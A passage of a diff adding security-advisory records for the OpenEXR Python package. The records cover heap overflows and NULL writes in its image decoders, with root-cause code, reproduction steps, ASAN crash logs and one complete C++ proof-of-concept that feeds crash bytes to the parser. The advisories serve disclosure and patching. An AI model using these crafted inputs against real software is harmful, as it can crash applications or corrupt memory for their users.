exr_uncompress_chunk  compression.c:541\n    #4 in exr_decoding_run  decoding.c:580\n    #5 in main  poc.c:83\n\n=================================================================\n==PID==ERROR: AddressSanitizer: SEGV on unknown address 0x7fe65cfbc800\n==PID==The signal is caused by a WRITE memory access.\n    #0 in memcpy  (libc)\n    #1 in uncompress_b44_impl  internal_b44.c:599\n    #2 in internal_exr_undo_b44  internal_b44.c:706\n    #3 in decompress_data  compression.c:444\n    #4 in exr_uncompress_chunk  compression.c:541\n    #5 in exr_decoding_run  decoding.c:580\n    #6 in main  poc.c:83\n\nSUMMARY: AddressSanitizer: SEGV \u2014 WRITE via memcpy in uncompress_b44_impl internal_b44.c:599\n```\n\n### Impact\nA crafted B44 or B44A EXR file can cause an out-of-bounds write in any application that decodes it via exr_decoding_run(). \nConsequences range from immediate crash (most likely) to corruption of adjacent heap allocations (layout-dependent).",
+      "published": "2026-04-03T21:47:07Z",
+      "modified": "2026-04-07T17:46:14.151649126Z",
+      "severity": {
+        "type": "CVSS_V4",
+        "score": "CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:A/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N"
+      },
+      "all_severity": [
+        {
+          "type": "CVSS_V4",
+          "score": "CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:A/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N"
+        }
+      ],
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/AcademySoftwareFoundation/openexr/security/advisories/GHSA-h762-rhv3-h25v"
+        },
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-34544"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/AcademySoftwareFoundation/openexr/commit/35e7aa35e22c1975606be86e859f31cc1fc598ee"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/AcademySoftwareFoundation/openexr"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/AcademySoftwareFoundation/openexr/releases/tag/v3.4.8"
+        }
+      ],
+      "osv_url": "https://osv.dev/vulnerability/GHSA-h762-rhv3-h25v",
+      "osv_ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "3.4.0"
+            },
+            {
+              "fixed": "3.4.8"
+            }
+          ]
+        }
+      ],
+      "osv_versions": [
+        "3.4.0",
+        "3.4.1",
+        "3.4.2",
+        "3.4.3",
+        "3.4.4",
+        "3.4.5",
+        "3.4.6",
+        "3.4.7"
+      ],
+      "affected_conda_versions": [
+        "3.3.2",
+        "3.3.3",
+        "3.3.4",
+        "3.3.5",
+        "3.4.0",
+        "3.4.4",
+        "3.4.5",
+        "3.4.6",
+        "3.4.7"
+      ]
+    },
+    {
+      "id": "GHSA-p8xc-w3q4-h64x",
+      "primary_id": "CVE-2026-34589",
+      "aliases": [
+        "CVE-2026-34589"
+      ],
+      "cve_ids": [
+        "CVE-2026-34589"
+      ],
+      "ecosystem": "PyPI",
+      "upstream_name": "openexr",
+      "summary": "OpenEXR: DWA Lossy Decoder Heap Out-of-Bounds Write",
+      "details": "## Summary\n\nThe DWA lossy decoder constructs temporary per-component block pointers using signed 32-bit arithmetic. For a large enough width, the calculation overflows and later decoder stores operate on a wrapped pointer outside the allocated `rowBlock` backing store.\n\nThis bug is reachable from the public decoder path and can be reproduced through the shipped `exrcheck` tool with a crafted scanline DWAA file. The confirmed dynamic symptom is a write-side crash in the lossy DCT execution path.\n\nTested on commit: 7820b7e1b93405ba1d551c43a945018226b75bc5\n\n## Root Cause and Data Flow\n\nThe vulnerable pointer construction lives in `src/lib/OpenEXRCore/internal_dwa_decoder.h`:\n\n```c\nfor (int comp = 1; comp < numComp; ++comp)\n    rowBlock[comp] = rowBlock[comp - 1] + numBlocksX * 64;\n```\n\nThe expression `numBlocksX * 64` is computed as signed `int`. Once `numBlocksX` is large enough, the multiplication wraps, and `rowBlock[comp]` points backward rather than forward into the temporary decode buffer.\n\nLater, `LossyDctDecoder_execute()` uses those derived pointers for real loads and stores during the block shuffle and reconstruction process. At that point the decoder is no longer operating within the bounds of the allocation created for `rowBlockHandle`.\n\nThe public control flow is the standard one:\n\n```c\nInputFile / ScanLineInputFile public read\n  -> exr_decoding_run(...)\n     -> exr_uncompress_chunk(...)\n        -> internal_exr_undo_dwaa(...)\n           -> DwaCompressor_uncompress(...)\n              -> LossyDctDecoder_execute(...)\n```\n\nUBSan gives a clean root-cause diagnosis on the overflowing multiply, while ASAN shows the later memory error in the write-side decode path.\n\n## Reproduction\n\n[dwa_scanline_exrcheck.zip](https://github.com/user-attachments/files/26318786/dwa_scanline_exrcheck.zip)\n\nBuild with `exrcheck` with ASAN and run:\n\n```\n\u276f ./build-asan/bin/exrcheck /tmp/dwa_scanline_exrcheck.exr\n file /tmp/dwa_scanline_exrcheck.exr /home/pop/sec/openexr/src/lib/OpenEXRCore/internal_dwa_decoder.h:331:58: runtime error: signed integer overflow: 33554432 * 64 cannot be represented in type 'int'\nAddressSanitizer:DEADLYSIGNAL\n=================================================================\n==1684058==ERROR: AddressSanitizer: SEGV on unknown address 0x758f8e5f0800 (pc 0x75979e850336 bp 0x7ffe8f1d3420 sp 0x7ffe8f1d30f0 T0)\n==1684058==The signal is caused by a WRITE memory access.\n    #0 0x75979e850336 in LossyDctDecoder_execute /home/pop/sec/openexr/src/lib/OpenEXRCore/internal_dwa_decoder.h:524\n    #1 0x75979e879592 in DwaCompressor_uncompress /home/pop/sec/openexr/src/lib/OpenEXRCore/internal_dwa_compressor.h:1210\n    #2 0x75979e879592 in internal_exr_undo_dwaa /home/pop/sec/openexr/src/lib/OpenEXRCore/internal_dwa.c:231\n    #3 0x75979e95f878 in exr_uncompress_chunk /home/pop/sec/openexr/src/lib/OpenEXRCore/compression.c:542\n    #4 0x75979e9659a8 in exr_decoding_run /home/pop/sec/openexr/src/lib/OpenEXRCore/decoding.c:580\n    #5 0x7597a0271add in run_decode /home/pop/sec/openexr/src/lib/OpenEXR/ImfScanLineInputFile.cpp:586\n    #6 0x7597a0283dc4 in Imf_4_0::ScanLineInputFile::Data::readPixels(Imf_4_0::FrameBuffer const&, int, int) /home/pop/sec/openexr/src/lib/OpenEXR/ImfScanLineInputFile.cpp:500\n    #7 0x7597a00c6a81 in Imf_4_0::InputFile::Data::readPixels(int, int) /home/pop/sec/openexr/src/lib/OpenEXR/ImfInputFile.cpp:458\n    #8 0x7597a13fe2dc in readScanline<Imf_4_0::InputPart> /home/pop/sec/openexr/src/lib/OpenEXRUtil/ImfCheckFile.cpp:239\n    #9 0x7597a1405b04 in readMultiPart /home/pop/sec/openexr/src/lib/OpenEXRUtil/ImfCheckFile.cpp:905\n    #10 0x7597a14126fd in runChecks<char const*> /home/pop/sec/openexr/src/lib/OpenEXRUtil/ImfCheckFile.cpp:1171\n    #11 0x7597a14146b9 in Imf_4_0::checkOpenEXRFile(char const*, bool, bool, bool) /home/pop/sec/openexr/src/lib/OpenEXRUtil/ImfCheckFile.cpp:1835\n    #12 0x61ba9582b8f8 in exrCheck(char const*, bool, bool, bool, bool) /home/pop/sec/openexr/src/bin/exrcheck/main.cpp:96\n    #13 0x61ba958282b1 in main /home/pop/sec/openexr/src/bin/exrcheck/main.cpp:164\n    #14 0x75979d62a1c9 in __libc_start_call_main ../sysdeps/nptl/libc_start_call_main.h:58\n    #15 0x75979d62a28a in __libc_start_main_impl ../csu/libc-start.c:360\n    #16 0x61ba95829844 in _start (/home/pop/sec/openexr/build-asan/bin/exrcheck+0xe844) (BuildId: 087c972343a5372940c42c0a2e7bce4a84288aec)\n\nAddressSanitizer can not provide additional info.\nSUMMARY: AddressSanitizer: SEGV /home/pop/sec/openexr/src/lib/OpenEXRCore/internal_dwa_decoder.h:524 in LossyDctDecoder_execute\n==1684058==ABORTING\n```\n-------\nFound by: Quang Luong of Calif.io",
+      "published": "2026-04-08T15:09:05Z",
+      "modified": "2026-04-08T15:26:49.379812Z",
+      "severity": {
+        "type": "CVSS_V4",
+        "score": "CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:A/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N"
+      },
+      "all_severity": [
+        {
+          "type": "CVSS_V3",
+          "score": "CVSS:3.1/AV:L/AC:L/PR:L/UI:R/S:U/C:N/I:N/A:H"
+        },
+        {
+          "type": "CVSS_V4",
+          "score": "CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:A/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N"
+        }
+      ],
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/AcademySoftwareFoundation/openexr/security/advisories/GHSA-p8xc-w3q4-h64x"
+        },
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-34589"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/AcademySoftwareFoundation/openexr"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/AcademySoftwareFoundation/openexr/releases/tag/v3.2.7"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/AcademySoftwareFoundation/openexr/releases/tag/v3.3.9"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/AcademySoftwareFoundation/openexr/releases/tag/v3.4.9"
+        }
+      ],
+      "osv_url": "https://osv.dev/vulnerability/GHSA-p8xc-w3q4-h64x",
+      "osv_ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "3.2.0"
+            },
+            {
+              "fixed": "3.2.7"
+            }
+          ]
+        }
+      ],
+      "osv_versions": [
+        "3.2.3",
+        "3.2.4",
+        "3.2.5",
+        "3.2.6"
+      ],
+      "affected_conda_versions": [
+        "3.3.2",
+        "3.3.3",
+        "3.3.4",
+        "3.3.5",
+        "3.4.0",
+        "3.4.4",
+        "3.4.5",
+        "3.4.6",
+        "3.4.7",
+        "3.4.8"
+      ]
+    },
+    {
+      "id": "GHSA-q6vj-wxvf-5m8c",
+      "primary_id": "CVE-2026-26981",
+      "aliases": [
+        "CVE-2026-26981"
+      ],
+      "cve_ids": [
+        "CVE-2026-26981"
+      ],
+      "ecosystem": "PyPI",
+      "upstream_name": "openexr",
+      "summary": "OpenEXR has heap-buffer-overflow via signed integer underflow in ImfContextInit.cpp",
+      "details": "## Summary\n\nA heap-buffer-overflow (OOB read) occurs in the `istream_nonparallel_read` function in `ImfContextInit.cpp` when parsing a malformed EXR file through a memory-mapped `IStream`. A signed integer subtraction produces a negative value that is implicitly converted to `size_t`, resulting in a massive length being passed to `memcpy`.\n\n## Affected Version\n\n- OpenEXR **main branch** (commit at time of testing)\n- `src/lib/OpenEXR/ImfContextInit.cpp`, lines 121\u2013136\n\n## Root Cause\n\n`ImfContextInit.cpp:121-126`:\n\n```cpp\nint64_t stream_sz = s->size ();           // e.g., 21 (actual file size)\nint64_t nend = nread + (int64_t)sz;       // e.g., 17 + 4096 = 4113\nif (stream_sz > 0 && nend > stream_sz)\n{\n    sz = stream_sz - nend;                // 21 - 4113 = -4092 (signed)\n}\n// ...\nmemcpy (buffer, data, sz);               // sz is size_t \u2192 wraps to 0xFFFFFFFFFFFFF004\n```\n\n`sz` is of type `size_t` (unsigned), but `stream_sz - nend` yields a negative `int64_t` value. This negative value is implicitly converted to `size_t`, wrapping around to a value close to `2^64`, which is then passed to `memcpy` causing a heap-buffer-overflow.\n\n**Suggested fix:** `sz = stream_sz - nend` \u2192 `sz = stream_sz - nread`\n\n## Reproduce\n\nBuild OpenEXR as static libraries with ASAN enabled, then compile the PoC below.\n\n**PoC Code:**\n\n```cpp\n#include <cstdint>\n#include <cstring>\n#include <iostream>\n\n#include <ImfMultiPartInputFile.h>\n#include <ImfInputPart.h>\n#include <ImfHeader.h>\n\nOPENEXR_IMF_INTERNAL_NAMESPACE_HEADER_ENTER\n\nclass MemMapIStream : public IStream\n{\npublic:\n    MemMapIStream (const uint8_t* data, size_t len)\n        : IStream (\"poc_input\")\n        , _data (reinterpret_cast<const char*> (data))\n        , _size (static_cast<int64_t> (len))\n        , _pos (0)\n    {}\n\n    bool isMemoryMapped () const override { return true; }\n\n    bool read (char c[], int n) override\n    {\n        int64_t avail = (_pos < _size) ? (_size - _pos) : 0;\n        int64_t copy  = (static_cast<int64_t> (n) < avail) ? n : avail;\n        if (copy > 0) memcpy (c, _data + _pos, copy);\n        _pos += n;\n        return _pos <= _size;\n    }\n\n    char* readMemoryMapped (int n) override\n    {\n        if (_pos + n > _size)\n            throw IEX_NAMESPACE::InputExc (\"read past end\");\n        const char* p = _data + _pos;\n        _pos += n;\n        return const_cast<char*> (p);\n    }\n\n    uint64_t tellg () override { return static_cast<uint64_t> (_pos); }\n    void     seekg (uint64_t pos) override { _pos = static_cast<int64_t> (pos); }\n\n    int64_t size () override { return _size; }\n\nprivate:\n    const char* _data;\n    int64_t     _size;\n    int64_t     _pos;\n};\n\nOPENEXR_IMF_INTERNAL_NAMESPACE_HEADER_EXIT\n\nint main ()\n{\n    static const uint8_t crash_data[] = {\n        0x76, 0x2f, 0x31, 0x01,\n        0x02, 0x06, 0x00, 0x00,\n        0x74, 0x69, 0x6c, 0x65, 0x73, 0x00,\n        0x20, 0x00, 0x00,\n        0x53, 0x00, 0x00, 0x00\n    };\n\n    try\n    {\n        Imf::MemMapIStream stream (crash_data, sizeof (crash_data));\n        Imf::MultiPartInputFile file (stream);\n    }\n    catch (const std::exception& e)\n    {\n        std::cout << \"Exception: \" << e.what () << \"\\n\";\n    }\n\n    return 0;\n}\n```\n\n**PoC Input:** https://drive.google.com/file/d/1VhjdK11LA0LHdW1mJJIQEo64mc5tpOUV/view?usp=drive_link\n\n## ASAN Log\n\n```\n==305348==ERROR: AddressSanitizer: negative-size-param: (size=-4096)\n    #0 0x62aee9fc732a in __asan_memcpy (/home/wjddn0623/fuzzing/openexr/exr_decode_fuzzer+0x23932a) (BuildId: c02729e73015cfda2879d44b5d5b25d4b5e68ae0)\n    #1 0x62aeea0e3377 in Imf_4_0::istream_nonparallel_read(_priv_exr_context_t const*, void*, void*, unsigned long, unsigned long, int (*)(_priv_exr_context_t const*, int, char const*, ...)) /home/wjddn0623/fuzzing/openexr/src/lib/OpenEXR/ImfContextInit.cpp:136:21\n    #2 0x62aeea15e75b in dispatch_read /home/wjddn0623/fuzzing/openexr/src/lib/OpenEXRCore/context.c:51:16\n    #3 0x62aeea19da19 in scratch_seq_skip /home/wjddn0623/fuzzing/openexr/src/lib/OpenEXRCore/parse_header.c:202:29\n    #4 0x62aeea197ec9 in check_populate_tiles /home/wjddn0623/fuzzing/openexr/src/lib/OpenEXRCore/parse_header.c:1560:9\n    #5 0x62aeea197ec9 in check_req_attr /home/wjddn0623/fuzzing/openexr/src/lib/OpenEXRCore/parse_header.c:2020:24\n    #6 0x62aeea197ec9 in pull_attr /home/wjddn0623/fuzzing/openexr/src/lib/OpenEXRCore/parse_header.c:2085:10\n    #7 0x62aeea197ec9 in internal_exr_parse_header /home/wjddn0623/fuzzing/openexr/src/lib/OpenEXRCore/parse_header.c:2848:18\n    #8 0x62aeea15f578 in exr_start_read /home/wjddn0623/fuzzing/openexr/src/lib/OpenEXRCore/context.c:270:49\n    #9 0x62aeea0d8130 in Imf_4_0::Context::Context(char const*, Imf_4_0::ContextInitializer const&, Imf_4_0::Context::read_mode_t) /home/wjddn0623/fuzzing/openexr/src/lib/OpenEXR/ImfContext.cpp:124:10\n    #10 0x62aeea0633ab in Imf_4_0::MultiPartInputFile::MultiPartInputFile(char const*, Imf_4_0::ContextInitializer const&, int, bool) /home/wjddn0623/fuzzing/openexr/src/lib/OpenEXR/ImfMultiPartInputFile.cpp:59:7\n    #11 0x62aeea0649de in Imf_4_0::MultiPartInputFile::MultiPartInputFile(Imf_4_0::IStream&, int, bool) /home/wjddn0623/fuzzing/openexr/src/lib/OpenEXR/ImfMultiPartInputFile.cpp:96:7\n    #12 0x62aeea00d522 in fuzz_cpp_headers(char const*, unsigned long) /home/wjddn0623/fuzzing/openexr/exr_decode_fuzzer.cc:167:31\n    #13 0x62aeea00d522 in fuzz_cpp_api(char const*, unsigned long) /home/wjddn0623/fuzzing/openexr/exr_decode_fuzzer.cc:460:5\n    #14 0x62aeea00a156 in LLVMFuzzerTestOneInput /home/wjddn0623/fuzzing/openexr/exr_decode_fuzzer.cc:927:5\n    #15 0x62aee9f15414 in fuzzer::Fuzzer::ExecuteCallback(unsigned char const*, unsigned long) (/home/wjddn0623/fuzzing/openexr/exr_decode_fuzzer+0x187414) (BuildId: c02729e73015cfda2879d44b5d5b25d4b5e68ae0)\n    #16 0x62aee9efe546 in fuzzer::RunOneTest(fuzzer::Fuzzer*, char const*, unsigned long) (/home/wjddn0623/fuzzing/openexr/exr_decode_fuzzer+0x170546) (BuildId: c02729e73015cfda2879d44b5d5b25d4b5e68ae0)\n    #17 0x62aee9f03ffa in fuzzer::FuzzerDriver(int*, char***, int (*)(unsigned char const*, unsigned long)) (/home/wjddn0623/fuzzing/openexr/exr_decode_fuzzer+0x175ffa) (BuildId: c02729e73015cfda2879d44b5d5b25d4b5e68ae0)\n    #18 0x62aee9f2e7b6 in main (/home/wjddn0623/fuzzing/openexr/exr_decode_fuzzer+0x1a07b6) (BuildId: c02729e73015cfda2879d44b5d5b25d4b5e68ae0)\n    #19 0x71035ee2a1c9 in __libc_start_call_main csu/../sysdeps/nptl/libc_start_call_main.h:58:16\n    #20 0x71035ee2a28a in __libc_start_main csu/../csu/libc-start.c:360:3\n    #21 0x62aee9ef9114 in _start (/home/wjddn0623/fuzzing/openexr/exr_decode_fuzzer+0x16b114) (BuildId: c02729e73015cfda2879d44b5d5b25d4b5e68ae0)\n\n0x503000000235 is located 0 bytes after 21-byte region [0x503000000220,0x503000000235)\nallocated by thread T0 here:\n    #0 0x62aeea007c61 in operator new[](unsigned long) (/home/wjddn0623/fuzzing/openexr/exr_decode_fuzzer+0x279c61) (BuildId: c02729e73015cfda2879d44b5d5b25d4b5e68ae0)\n    #1 0x62aee9f15325 in fuzzer::Fuzzer::ExecuteCallback(unsigned char const*, unsigned long) (/home/wjddn0623/fuzzing/openexr/exr_decode_fuzzer+0x187325) (BuildId: c02729e73015cfda2879d44b5d5b25d4b5e68ae0)\n    #2 0x62aee9efe546 in fuzzer::RunOneTest(fuzzer::Fuzzer*, char const*, unsigned long) (/home/wjddn0623/fuzzing/openexr/exr_decode_fuzzer+0x170546) (BuildId: c02729e73015cfda2879d44b5d5b25d4b5e68ae0)\n    #3 0x62aee9f03ffa in fuzzer::FuzzerDriver(int*, char***, int (*)(unsigned char const*, unsigned long)) (/home/wjddn0623/fuzzing/openexr/exr_decode_fuzzer+0x175ffa) (BuildId: c02729e73015cfda2879d44b5d5b25d4b5e68ae0)\n    #4 0x62aee9f2e7b6 in main (/home/wjddn0623/fuzzing/openexr/exr_decode_fuzzer+0x1a07b6) (BuildId: c02729e73015cfda2879d44b5d5b25d4b5e68ae0)\n    #5 0x71035ee2a1c9 in __libc_start_call_main csu/../sysdeps/nptl/libc_start_call_main.h:58:16\n    #6 0x71035ee2a28a in __libc_start_main csu/../csu/libc-start.c:360:3\n    #7 0x62aee9ef9114 in _start (/home/wjddn0623/fuzzing/openexr/exr_decode_fuzzer+0x16b114) (BuildId: c02729e73015cfda2879d44b5d5b25d4b5e68ae0)\n\nSUMMARY: AddressSanitizer: negative-size-param (/home/wjddn0623/fuzzing/openexr/exr_decode_fuzzer+0x23932a) (BuildId: c02729e73015cfda2879d44b5d5b25d4b5e68ae0) in __asan_memcpy\n==305348==ABORTING\n```\n\n## Impact\n\n- **DoS** \u2014 Any application that opens a crafted EXR file will crash immediately\n- **CWE-195** (Signed to Unsigned Conversion Error) \u2192 **CWE-122** (Heap-based Buffer Overflow)\n- Affects any application using an `IStream` implementation where `isMemoryMapped()` returns `true`",
+      "published": "2026-04-06T17:51:37Z",
+      "modified": "2026-04-06T18:02:28.066180Z",
+      "severity": {
+        "type": "CVSS_V3",
+        "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H"
+      },
+      "all_severity": [
+        {
+          "type": "CVSS_V3",
+          "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H"
+        }
+      ],
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/AcademySoftwareFoundation/openexr/security/advisories/GHSA-q6vj-wxvf-5m8c"
+        },
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-26981"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/AcademySoftwareFoundation/openexr/commit/6bb2ddf1068573d073edf81270a015b38cc05cef"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/AcademySoftwareFoundation/openexr/commit/d2be382758adc3e9ab83a3de35138ec28d93ebd8"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/AcademySoftwareFoundation/openexr"
+        }
+      ],
+      "osv_url": "https://osv.dev/vulnerability/GHSA-q6vj-wxvf-5m8c",
+      "osv_ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "3.3.0"
+            },
+            {
+              "fixed": "3.3.7"
+            }
+          ]
+        }
+      ],
+      "osv_versions": [
+        "3.3.0",
+        "3.3.1",
+        "3.3.2",
+        "3.3.3",
+        "3.3.4",
+        "3.3.5",
+        "3.3.6"
+      ],
+      "affected_conda_versions": [
+        "3.3.2",
+        "3.3.3",
+        "3.3.4",
+        "3.3.5",
+        "3.4.0",
+        "3.4.4"
+      ]
+    },
+    {
+      "id": "GHSA-qhpm-86v7-phmm",
+      "primary_id": "CVE-2025-48073",
+      "aliases": [
+        "CVE-2025-48073"
+      ],
+      "cve_ids": [
+        "CVE-2025-48073"
+      ],
+      "ecosystem": "PyPI",
+      "upstream_name": "openexr",
+      "summary": "OpenEXR ScanLineProcess::run_fill NULL Pointer Write In \"reduceMemory\" Mode",
+      "details": "### Summary\n\nWhen reading a deep scanline image with a large sample count in `reduceMemory` mode, it is possible to crash a target application with a NULL pointer dereference in a write operation.\n\n### Details\n\nIn the `ScanLineProcess::run_fill`\u00a0function, implemented in `src/lib/OpenEXR/ImfDeepScanLineInputFile.cpp`, the following code is used to write the `fillValue`\u00a0in the sample buffer:\n\n```cpp\n                switch (fills.type)\n                {\n                    case OPENEXR_IMF_INTERNAL_NAMESPACE::UINT:\n                    {\n                        unsigned int fillVal = (unsigned int) (fills.fillValue);\n                        unsigned int* fillptr = static_cast<unsigned int*> (dest);\n\n                        for ( int32_t s = 0; s < samps; ++s )\n                            fillptr[s] = fillVal; // <--- POTENTIAL CRASH HERE\n                        break;\n                    }\n```\n\nHowever, when `reduceMemory` mode is enabled in the `readDeepScanLine` function in `src/lib/OpenEXRUtil/ImfCheckFile.cpp`, with large sample counts, the sample data will not be read, as shown below:\n\n```cpp\n            // limit total number of samples read in reduceMemory mode\n            //\n            if (!reduceMemory ||\n                fileBufferSize + bufferSize < gMaxBytesPerDeepScanline) // <--- CHECK ON LARGE SAMPLE COUNTS AND reduceMemory\n            {\n            // SNIP...\n            try\n                {\n                    in.readPixels (y);\n                }\n```\n\nTherefore, in those cases, the sample buffer would not be allocated, resulting in a potential write operation on a NULL pointer.\n\n### PoC\n\nNOTE: please download the `runfill_crash.exr` file from the following link:\n \nhttps://github.com/ShielderSec/poc/tree/main/CVE-2025-48073\n\n1. Compile the `exrcheck` binary in a macOS or GNU/Linux machine with ASAN.\n2. Open the `runfill_crash.exr` file with the following command:\n\n```\nexrcheck -m runfill_crash.exr\n```\n\n3. Notice that `exrcheck` crashes with ASAN stack-trace.\n\n### Impact\nAn attacker may cause a denial of service by crashing the application.",
+      "published": "2025-07-31T19:21:35Z",
+      "modified": "2025-08-01T13:29:06Z",
+      "severity": {
+        "type": "CVSS_V4",
+        "score": "CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:A/VC:N/VI:N/VA:L/SC:N/SI:N/SA:N"
+      },
+      "all_severity": [
+        {
+          "type": "CVSS_V4",
+          "score": "CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:A/VC:N/VI:N/VA:L/SC:N/SI:N/SA:N"
+        }
+      ],
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/AcademySoftwareFoundation/openexr/security/advisories/GHSA-qhpm-86v7-phmm"
+        },
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-48073"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/AcademySoftwareFoundation/openexr"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/ShielderSec/poc/tree/main/CVE-2025-48073"
+        }
+      ],
+      "osv_url": "https://osv.dev/vulnerability/GHSA-qhpm-86v7-phmm",
+      "osv_ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "3.3.2"
+            },
+            {
+              "fixed": "3.3.3"
+            }
+          ]
+        }
+      ],
+      "osv_versions": [
+        "3.3.2"
+      ],
+      "affected_conda_versions": [
+        "3.3.2"
+      ]
+    },
+    {
+      "id": "GHSA-qxh9-r8xw-7v99",
+      "primary_id": "CVE-2017-9111",
+      "aliases": [
+        "CVE-2017-9111"
+      ],
+      "cve_ids": [
+        "CVE-2017-9111"
+      ],
+      "ecosystem": "PyPI",
+      "upstream_name": "openexr",
+      "summary": "OpenEXR invalid write",
+      "details": "In OpenEXR 2.2.0, an invalid write of size 8 in the storeSSE function in ImfOptimizedPixelReading.h could cause the application to crash or execute arbitrary code.",
+      "published": "2022-05-13T01:17:50Z",
+      "modified": "2025-04-22T19:12:05.603219Z",
+      "severity": {
+        "type": "CVSS_V3",
+        "score": "CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H"
+      },
+      "all_severity": [
+        {
+          "type": "CVSS_V3",
+          "score": "CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H"
+        }
+      ],
+      "references": [
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2017-9111"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/openexr/openexr/issues/232"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/openexr/openexr/pull/233"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/AcademySoftwareFoundation/openexr"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/openexr/openexr/releases/tag/v2.2.1"
+        },
+        {
+          "type": "WEB",
+          "url": "https://lists.debian.org/debian-lts-announce/2020/08/msg00056.html"
+        },
+        {
+          "type": "WEB",
+          "url": "https://usn.ubuntu.com/4148-1"
+        },
+        {
+          "type": "WEB",
+          "url": "https://usn.ubuntu.com/4339-1"
+        },
+        {
+          "type": "WEB",
+          "url": "https://www.debian.org/security/2020/dsa-4755"
+        },
+        {
+          "type": "WEB",
+          "url": "http://lists.opensuse.org/opensuse-security-announce/2019-07/msg00060.html"
+        },
+        {
+          "type": "WEB",
+          "url": "http://lists.opensuse.org/opensuse-security-announce/2019-08/msg00000.html"
+        },
+        {
+          "type": "WEB",
+          "url": "http://www.openwall.com/lists/oss-security/2017/05/12/5"
+        }
+      ],
+      "osv_url": "https://osv.dev/vulnerability/GHSA-qxh9-r8xw-7v99",
+      "osv_ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "2.2.1"
+            }
+          ]
+        }
+      ],
+      "osv_versions": [
+        "1.0.2",
+        "1.0.3",
+        "1.1.0",
+        "1.2.0",
+        "1.3.0",
+        "1.3.1",
+        "1.3.2",
+        "1.3.7",
+        "1.3.8",
+        "1.3.9"
+      ],
+      "affected_conda_versions": [
+        "1.3.2",
+        "1.3.7",
+        "1.3.8",
+        "1.3.9"
+      ]
+    },
+    {
+      "id": "GHSA-vc68-257w-m432",
+      "primary_id": "CVE-2026-34543",
+      "aliases": [
+        "CVE-2026-34543"
+      ],
+      "cve_ids": [
+        "CVE-2026-34543"
+      ],
+      "ecosystem": "PyPI",
+      "upstream_name": "openexr",
+      "summary": "OpenEXR: Heap information disclosure in PXR24 decompression via unchecked decompressed size (undo_pxr24_impl)",
+      "details": "### Summary\nThe PXR24 decompression function undo_pxr24_impl in OpenEXR (internal_pxr24.c) ignores the actual decompressed size (outSize) returned by exr_uncompress_buffer() and instead reads from the scratch buffer based solely on the expected size (uncompressed_size) derived from the header metadata.\n\nAdditionally, exr_uncompress_buffer() (compression.c:202) treats LIBDEFLATE_SHORT_OUTPUT (where the compressed stream decompresses to fewer bytes than expected) as a successful result rather than an error.\n\nWhen these two issues are combined, an attacker can craft a PXR24 EXR file containing a valid but truncated zlib stream. As a result, the decoder reads uninitialized heap memory and incorporates it into the output pixel data.\n\n### Details\nThis issue occurs due to the combination of two flaws.\n\n1. compression.c:202\u2013205 \u2014 LIBDEFLATE_SHORT_OUTPUT treated as success\n```\nelse if (res == LIBDEFLATE_SHORT_OUTPUT)\n{\n    /* TODO: is this an error? */\n    return EXR_ERR_SUCCESS;\n}\n```\nlibdeflate_zlib_decompress_ex() returns LIBDEFLATE_SHORT_OUTPUT when the compressed stream is successfully decompressed but the resulting output size is smaller than the provided output buffer size. In this case, the actual number of decompressed bytes is written to actual_out. However, the function does not treat this condition as an error and instead returns success.\n\n2. internal_pxr24.c:279\u2013287 \u2014 outSize return value ignored\n```\nrstat = exr_uncompress_buffer(\n    decode->context, compressed_data, comp_buf_size,\n    scratch_data, scratch_size, &outSize);   // outSize = actual bytes written\n\nif (rstat != EXR_ERR_SUCCESS) return rstat;\n\n// outSize is never referenced afterwards.\n// The loop below reads the entire scratch_data buffer based on\n// 